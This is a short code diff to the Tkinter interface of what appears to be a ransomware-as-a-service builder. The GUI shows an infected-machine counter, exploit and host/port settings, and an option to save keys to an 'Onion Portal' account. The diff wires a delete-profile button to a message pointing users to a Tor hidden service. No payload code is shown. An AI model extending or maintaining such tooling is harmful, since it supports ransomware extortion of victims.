@@ -716,12 +716,14 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(self.prof, text = 'Machines inftected: ', background = 'white').grid(row = 7, column = 0, sticky = 'w')
         Label(self.prof, text = self.options['inf_counter'].get(), background = 'white').grid(row = 7, column = 1, sticky = 'w')
 
-        delete = Button(self.prof, text = "DELETE PROFILE", command = self.upgrade, width = 53)
+        delete = Button(self.prof, text = "DELETE PROFILE", command = self.delete_me, width = 53)
         delete.grid(row = 6, column = 0, columnspan = 2)
-        delete.config(state = DISABLED)
 
         upg = Button(self.prof, text = "UPGRADE", command = self.upgrade, width = 53)
         upg.grid(row = 7, column = 0, columnspan = 2)
+
+    def delete_me(self):
+        return messagebox.showinfo('Cannot do that', 'Please, visit: http://jezsjxtthkqhlqoc.onion/ with Tor browser and login.\n\nYou can delete your profile under the Profile section there.')
 
     def exploit_options(self):
         self.exp = Toplevel()
@@ -748,7 +750,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         port = Entry(self.set, textvariable = self.options['port'], width = 30)
         port.grid(row = 4, column = 0, columnspan = 2)
 
-        Checkbutton(self.set, text = "Save keys to raasnet.zeznzo.nl account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
+        Checkbutton(self.set, text = "Save keys to Onion Portal account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
 
         if host == None or host == '':
             messagebox.showwarning('ERROR', 'Invalid host!')
